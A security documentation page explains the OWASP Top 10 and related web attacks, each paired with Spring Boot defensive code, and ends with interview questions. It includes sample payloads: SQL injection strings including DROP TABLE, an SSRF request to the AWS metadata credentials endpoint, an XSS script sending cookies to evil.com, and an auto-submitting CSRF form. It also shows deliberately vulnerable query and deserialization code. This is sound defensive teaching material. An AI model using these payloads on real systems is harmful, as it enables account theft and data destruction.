---
id: web-vulnerabilities
title: Web Vulnerabilities & Defenses
sidebar_label: Web Vulnerabilities
description: Comprehensive guide to OWASP Top 10 and beyond — SQL injection, XSS, CSRF, SSRF, XXE, broken access control, insecure deserialization, and their mitigations in Spring Boot applications.
tags: [security, owasp, sql-injection, xss, csrf, ssrf, xxe, vulnerability, spring-security, web-security]
---

# Web Vulnerabilities & Defenses

> Based on [OWASP Top 10](https://owasp.org/Top10/) — the most critical web application security risks.

---

## A01 — Broken Access Control

The #1 risk. Restrictions on what users can do are not properly enforced.

### Attack Examples
```
# Insecure Direct Object Reference (IDOR)
GET /api/orders/1234       ← User A's order
GET /api/orders/1235       ← User B's order (attacker increments ID)

# Privilege escalation
PUT /api/users/42 { "role": "ADMIN" }  ← Regular user sets own role to ADMIN

# Forced browsing
GET /admin/dashboard       ← No role check on backend
```

### Defenses
```java
// ALWAYS verify ownership server-side
@GetMapping("/api/orders/{orderId}")
public Order getOrder(@PathVariable Long orderId,
                      @AuthenticationPrincipal UserDetails user) {
    Order order = orderRepository.findById(orderId)
        .orElseThrow(() -> new ResourceNotFoundException("Order not found"));

    // Ownership check — never trust client to send their own user ID
    if (!order.getUserId().equals(((AppUser) user).getId())
            && !user.getAuthorities().contains(new SimpleGrantedAuthority("ROLE_ADMIN"))) {
        throw new AccessDeniedException("Access denied");
    }
    return order;
}

// Deny by default — explicitly permit what's needed
http.authorizeHttpRequests(auth -> auth
    .requestMatchers("/public/**").permitAll()
    .anyRequest().authenticated()   // Default: require auth
);

// Never expose internal IDs directly — use UUIDs or opaque tokens
@Entity
public class Order {
    @Id Long internalId;           // Auto-increment, never exposed
    String publicId = UUID.randomUUID().toString();  // Exposed in API
}
```

---

## A02 — Cryptographic Failures

Sensitive data exposed due to weak or missing cryptography.

### Attack Examples
- Passwords stored in plaintext or MD5
- Sensitive data transmitted over HTTP
- Weak TLS configurations (TLS 1.0, weak ciphers)
- Hardcoded secrets in source code

### Defenses
```java
// ✅ Use BCrypt for passwords (see Authentication doc)
// ✅ Encrypt PII at rest
@Converter
public class EncryptedStringConverter implements AttributeConverter<String, String> {
    @Autowired private AesEncryptionService aes;

    @Override
    public String convertToDatabaseColumn(String attribute) {
        return attribute != null ? aes.encrypt(attribute) : null;
    }

    @Override
    public String convertToEntityAttribute(String dbData) {
        return dbData != null ? aes.decrypt(dbData) : null;
    }
}

@Entity
public class UserProfile {
    @Convert(converter = EncryptedStringConverter.class)
    private String ssn;  // Encrypted in DB

    @Convert(converter = EncryptedStringConverter.class)
    private String phoneNumber;
}

// ✅ Enforce TLS in Spring Boot
server:
  ssl:
    enabled: true
    protocol: TLS
    enabled-protocols: TLSv1.3,TLSv1.2
    ciphers: TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256
```

---

## A03 — SQL Injection

Attacker injects SQL into query strings.

### Attack Example
```java
// VULNERABLE — string concatenation
String query = "SELECT * FROM users WHERE email = '" + email + "'";
// Attacker input: ' OR '1'='1
// Resulting query: SELECT * FROM users WHERE email = '' OR '1'='1'
// → Returns ALL users

// DROP TABLE attack:
// email = "'; DROP TABLE users; --"
```

### Defenses
```java
// ✅ Parameterized queries — always
// JPA Repository (safe)
Optional<User> findByEmail(String email); // Spring Data generates safe query

// JPQL with named parameter (safe)
@Query("SELECT u FROM User u WHERE u.email = :email AND u.active = true")
Optional<User> findActiveByEmail(@Param("email") String email);

// JDBC Template (safe)
jdbcTemplate.queryForObject(
    "SELECT * FROM users WHERE email = ? AND active = ?",
    userRowMapper, email, true
);

// ✅ For dynamic ORDER BY (can't parameterize column names)
private static final Set<String> ALLOWED_SORT_COLUMNS =
    Set.of("name", "email", "created_at");

public List<User> findUsers(String sortBy) {
    if (!ALLOWED_SORT_COLUMNS.contains(sortBy)) {
        throw new IllegalArgumentException("Invalid sort column: " + sortBy);
    }
    // Now safe to use in query
    return jdbcTemplate.query("SELECT * FROM users ORDER BY " + sortBy, userRowMapper);
}

// ✅ ORM — Hibernate/JPA handles parameterization automatically
// ✅ Stored procedures with parameters (not dynamic SQL inside proc)
// ✅ Principle of least privilege — DB user cannot DROP tables
```

### Blind SQL Injection
Attacker gets no direct output — infers data through:
- **Boolean-based**: Response differs for true/false conditions
- **Time-based**: `'; WAITFOR DELAY '0:0:5'; --`

**Defense**: Same — parameterized queries prevent all forms of SQL injection.

---

## A04 — Insecure Design

Security not considered in the design phase.

### Examples
- No rate limiting on login → brute force possible
- Password reset link valid forever
- "Security questions" as authentication factor
- No fraud detection on financial transactions

### Defenses
- Threat modeling before building
- Security requirements in every user story
- Defense-in-depth: multiple controls, not just one

---

## A05 — Security Misconfiguration

Default configs, unnecessary features, verbose error messages.

### Attack Examples
```
# Default credentials
Spring Boot Actuator exposed without auth:
GET /actuator/env → leaks all environment variables (including secrets)
GET /actuator/heapdump → dumps full JVM heap (extracts secrets from memory)

# Verbose error messages
Internal Server Error:
  java.sql.SQLException: Table 'mydb.users' doesn't exist
  at com.example.UserRepository.findAll(UserRepository.java:42)
  → Attacker learns DB name, table names, stack trace
```

### Defenses
```yaml
# application.yml — secure actuator config
management:
  endpoints:
    web:
      exposure:
        include: health,info          # Only expose safe endpoints
  endpoint:
    health:
      show-details: when-authorized   # Details only for authenticated users
  server:
    port: 8081                        # Different port, internal only

# Disable in production
spring:
  mvc:
    throw-exception-if-no-handler-found: false
```

```java
// Generic error responses — never leak internals
@RestControllerAdvice
public class GlobalExceptionHandler {
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleUnexpected(Exception ex) {
        log.error("Unexpected error", ex); // Log full details internally
        return ResponseEntity
            .status(HttpStatus.INTERNAL_SERVER_ERROR)
            .body(new ErrorResponse("An unexpected error occurred")); // Generic to client
    }

    @ExceptionHandler(AccessDeniedException.class)
    public ResponseEntity<ErrorResponse> handleAccessDenied(AccessDeniedException ex) {
        // Don't reveal WHY access was denied (resource may not even exist)
        return ResponseEntity.status(HttpStatus.NOT_FOUND)
            .body(new ErrorResponse("Resource not found"));
    }
}
```

---

## A06 — Vulnerable and Outdated Components

Using libraries with known CVEs.

### Defenses
```xml
<!-- Maven — OWASP dependency check plugin -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.0</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS> <!-- Fail on CVSS >= 7 (High) -->
    </configuration>
</plugin>
```

```yaml
# GitHub Actions — Dependabot auto-updates
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "maven"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

Tools: **Snyk**, **OWASP Dependency Check**, **GitHub Dependabot**, **JFrog Xray**.

---

## A07 — Identification and Authentication Failures

Weak credentials, missing MFA, poor session management.

### Attack Examples
- Credential stuffing (breached password lists)
- Brute force on login
- Predictable session IDs
- Sessions not invalidated on logout

### Defenses
```java
// Account lockout after N failed attempts
@Service
public class LoginAttemptService {
    private final int MAX_ATTEMPTS = 5;
    private final Duration LOCKOUT = Duration.ofMinutes(15);

    @Autowired private RedisTemplate<String, Integer> redis;

    public void recordFailure(String username) {
        String key = "login_fail:" + username;
        Long count = redis.opsForValue().increment(key);
        if (count == 1) redis.expire(key, LOCKOUT); // Start TTL on first failure
        if (count >= MAX_ATTEMPTS) {
            redis.expire("locked:" + username, LOCKOUT);
        }
    }

    public boolean isLocked(String username) {
        return Boolean.TRUE.equals(redis.hasKey("locked:" + username));
    }

    public void resetFailures(String username) {
        redis.delete("login_fail:" + username);
        redis.delete("locked:" + username);
    }
}

// Logout — invalidate session AND JWT
@PostMapping("/auth/logout")
public ResponseEntity<Void> logout(
        HttpServletRequest request,
        @AuthenticationPrincipal JwtAuthToken token) {
    // Blacklist JWT (by jti) until its natural expiry
    String jti = token.getTokenAttributes().get("jti").toString();
    Instant expiry = token.getTokenAttributes().get("exp") // ...
    redis.opsForValue().set("revoked:" + jti, "1",
        Duration.between(Instant.now(), expiry));

    // Invalidate session if any
    request.getSession(false).invalidate();

    return ResponseEntity.noContent().build();
}
```

---

## A08 — Software and Data Integrity Failures

Insecure deserialization, unsigned updates.

### Java Deserialization Attack
```java
// VULNERABLE — deserializing untrusted data
ObjectInputStream ois = new ObjectInputStream(userInput);
Object obj = ois.readObject(); // Can trigger gadget chains → RCE!

// Attacker crafts malicious serialized object using ysoserial tool
// → Remote Code Execution on deserialization
```

### Defenses
```java
// ✅ Never deserialize untrusted Java serialized objects
// ✅ Use JSON/XML with schema validation instead
// ✅ If unavoidable — use a look-ahead ObjectInputStream
ObjectInputStream ois = new LookAheadObjectInputStream(input,
    AllowedClass1.class, AllowedClass2.class); // Whitelist

// ✅ Verify integrity of downloaded artifacts
// Verify SHA-256 checksum of downloaded JAR before loading:
String expectedHash = "abc123...";
String actualHash = DigestUtils.sha256Hex(Files.readAllBytes(jarPath));
if (!expectedHash.equals(actualHash)) throw new SecurityException("Tampered artifact");
```

---

## A09 — Security Logging and Monitoring Failures

Insufficient logging makes breaches go undetected.

### What to Log
```java
// Security events that MUST be logged
log.warn("LOGIN_FAILED user={} ip={} reason={}", username, ip, reason);
log.info("LOGIN_SUCCESS user={} ip={} mfa={}", username, ip, mfaUsed);
log.warn("ACCESS_DENIED user={} resource={} action={}", user, resource, action);
log.info("PASSWORD_CHANGED user={} ip={}", username, ip);
log.warn("PRIVILEGE_ESCALATION_ATTEMPT user={} attempted_role={}", user, role);
log.warn("RATE_LIMIT_EXCEEDED ip={} endpoint={}", ip, endpoint);
log.info("DATA_EXPORT user={} records={}", username, count);  // PII access
log.warn("ACCOUNT_LOCKED user={} reason={}", username, reason);
```

### What NOT to Log
```java
// NEVER log these
log.info("User password: {}", password);        // ❌ Credential leak
log.info("Token: {}", jwtToken);                // ❌ Token leak
log.info("Credit card: {}", cardNumber);        // ❌ PCI violation
log.debug("Request body: {}", fullRequestBody); // ❌ May contain PII
```

---

## A10 — Server-Side Request Forgery (SSRF)

Server makes HTTP requests to attacker-controlled URLs.

### Attack Example
```
# Feature: "Import product image from URL"
POST /api/import { "imageUrl": "http://user-provided.com/image.jpg" }

# Attacker provides internal URLs:
{ "imageUrl": "http://169.254.169.254/latest/meta-data/iam/credentials" }
# → AWS EC2 metadata service leaks IAM credentials!

{ "imageUrl": "http://internal-db:5432/" }
# → Probes internal network
```

### Defenses
```java
@Service
public class SafeHttpClient {
    private static final Set<String> BLOCKED_HOSTS = Set.of(
        "169.254.169.254",   // AWS metadata
        "metadata.google.internal",
        "localhost", "127.0.0.1", "::1",
        "0.0.0.0"
    );
    private static final Set<String> ALLOWED_SCHEMES = Set.of("https");

    public byte[] fetchExternalResource(String urlString) {
        URL url = new URL(urlString);

        // 1. Allow only HTTPS
        if (!ALLOWED_SCHEMES.contains(url.getProtocol())) {
            throw new SecurityException("Only HTTPS URLs allowed");
        }

        // 2. Resolve hostname and check against blocklist
        InetAddress address = InetAddress.getByName(url.getHost());
        String resolved = address.getHostAddress();

        if (BLOCKED_HOSTS.contains(url.getHost())
                || isPrivateAddress(address)
                || BLOCKED_HOSTS.contains(resolved)) {
            throw new SecurityException("Access to internal resources denied");
        }

        // 3. Allowlist domains if possible
        if (!isAllowedDomain(url.getHost())) {
            throw new SecurityException("Domain not in allowlist");
        }

        return restTemplate.getForObject(urlString, byte[].class);
    }

    private boolean isPrivateAddress(InetAddress addr) {
        return addr.isLoopbackAddress()
            || addr.isLinkLocalAddress()
            || addr.isSiteLocalAddress()
            || addr.isAnyLocalAddress();
    }
}
```

---

## Cross-Site Scripting (XSS)

### Types
| Type | Persistence | Source |
|---|---|---|
| **Stored XSS** | Persisted in DB | Comment, profile bio |
| **Reflected XSS** | URL parameter | Search query in response |
| **DOM-based XSS** | Client-side only | JavaScript reads from URL/localStorage |

### Attack Example
```html
<!-- Attacker stores in comment field: -->
<script>
  document.location='https://evil.com/steal?cookie='+document.cookie;
</script>
<!-- When rendered, victim's cookies sent to attacker -->
```

### Defenses
```java
// ✅ Escape all output — use Thymeleaf (auto-escapes by default)
// th:text escapes HTML entities
<p th:text="${userComment}">...</p>
// vs th:utext (UNSAFE — raw HTML, avoid unless sanitized)

// ✅ Content Security Policy (CSP)
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp.policyDirectives(
            "default-src 'self'; " +
            "script-src 'self' 'nonce-{RANDOM}'; " +  // Only allow scripts with nonce
            "style-src 'self' https://fonts.googleapis.com; " +
            "img-src 'self' data: https:; " +
            "object-src 'none'; " +
            "base-uri 'self'; " +
            "frame-ancestors 'none'"
        ))
    );
    return http.build();
}

// ✅ Sanitize user-provided HTML (e.g., rich text editor)
// Use OWASP Java HTML Sanitizer
PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safeHtml = policy.sanitize(userProvidedHtml);
```

---

## Cross-Site Request Forgery (CSRF)

Attacker tricks authenticated user's browser into making unwanted requests.

### Attack
```html
<!-- On attacker's site: -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
<!-- Victim's browser auto-sends session cookie → transfer executes! -->
```

### Defenses
```java
// ✅ Spring Security CSRF protection (enabled by default for non-SPA)
// Synchronizer Token Pattern: server sends hidden token, must match on POST

// For REST APIs with SPA (stateless JWT) — CSRF less relevant since no cookie auth
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    // SPA reads XSRF-TOKEN cookie, sends as X-XSRF-TOKEN header
);

// ✅ SameSite cookie attribute (primary CSRF protection)
// SameSite=Strict: no cross-site requests at all
// SameSite=Lax: no cross-site POST (sufficient for most cases)
```

---

## Clickjacking

Attacker embeds your site in an iframe to trick users into clicking.

```java
// Prevent your site from being embedded in iframes
http.headers(headers -> headers
    .frameOptions(frame -> frame.deny()) // X-Frame-Options: DENY
);
// OR use CSP: frame-ancestors 'none'
```

---

## Interview Questions

1. What is SQL injection and how do you prevent it in Spring Boot?
2. What is the difference between Stored XSS and Reflected XSS?
3. What is CSRF? When does it NOT apply (hint: JWT + no cookies)?
4. What is SSRF and how do you prevent it?
5. What is an IDOR vulnerability? Give a real-world example.
6. What HTTP security headers should every web app include?
7. Why is Java object deserialization dangerous?
8. What is the purpose of Content Security Policy (CSP)?
9. How does clickjacking work and what prevents it?
10. What should and should not be included in error messages returned to clients?
11. How do you detect and defend against credential stuffing attacks?
12. What is path traversal and how do you prevent it in file download endpoints?
